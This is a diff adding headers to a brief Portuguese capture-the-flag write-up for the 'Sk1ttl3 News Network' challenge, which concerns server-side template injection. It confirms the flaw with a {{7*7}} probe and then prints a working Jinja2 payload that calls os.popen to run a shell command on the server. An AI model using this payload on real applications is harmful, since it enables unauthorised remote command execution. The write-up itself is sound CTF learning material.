@@ -1,8 +1,15 @@
-
+# Sk1ttl3 News Network
+###### Solved by @Mayaracar2
+> This is a CTF about SSTI,Web Exploitation
+##Sk1ttl3 News Network
+### Introdução
+Explorar uma vulnerabilidade de SSTI em um site que armazena um respectivo jornal.
+### Análise Inicial
 Ao realizar o teste {{7*7}}, printou o resultado 49 na tela, logo sabemos que é vulnerável a SSTI.
 
 <img width="749" height="504" alt="image" src="https://github.com/user-attachments/assets/91f3b592-d158-4183-8753-b44f996be8c3" />
 
+###
 foi realizado o seguinte comando 
 
 `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}`
